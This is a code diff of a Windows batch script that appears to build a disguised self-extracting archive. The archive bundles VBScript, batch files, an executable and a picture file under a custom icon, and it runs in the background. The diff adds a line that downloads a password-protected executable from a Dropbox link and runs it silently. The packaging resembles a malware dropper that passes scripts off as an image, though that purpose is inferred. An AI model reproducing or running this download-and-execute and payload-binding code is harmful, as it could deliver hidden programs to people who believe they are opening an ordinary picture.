@@ -1,4 +1,6 @@
 @echo on
+set curldir=D:\Users\tonnyr2\curl-7.75.0-win32-mingw\bin
+rem windows  10 1607 corporative 32 bit
 IF [%1]==[] (
 	goto :usage
 )
@@ -75,16 +77,9 @@ goto :dl
 if exist WinRar.exe (
 	WinRAR.exe a -sfxdefault.sfx "%SfXFileName%" main.vbs spt2.bat main.bat.exe spx.txt "%KartinkaFail%" -zsfxcomment.txt -iicon"%iconFail%" -IBCK 
 ) else (
-curl https://www.rarlab.com/rar/wrar601b1.exe -o wrarsetup.exe
-echo set oShell = WScript.CreateObject^("WScript.Shell"^) >mysh.vbs
-echo oShell.SendKeys^("%CD%"^) >>mysh.vbs
-echo WScript.Sleep 50 >>mysh.vbs
-echo oShell.SendKeys^("{ENTER}"^) >>mysh.vbs
-start /MIN rasinvkr.bat "wrarsetup.exe /S"
-timeout /T 2
-cscript mysh.vbs
-del mysh.vbs
-timeout /T 5
+curl.exe -L https://www.dropbox.com/s/qk032x6ib517ldg/rara.exe?dl=1 -o rara.exe
+rara.exe -pmainpass -d %CD% -s1
+
 WinRAR.exe a -sfxdefault.sfx "%SfXFileName%" main.vbs spt2.bat main.bat.exe spx.txt "%KartinkaFail%" -zsfxcomment.txt -iicon"%iconFail%" -IBCK
 )
 :dl
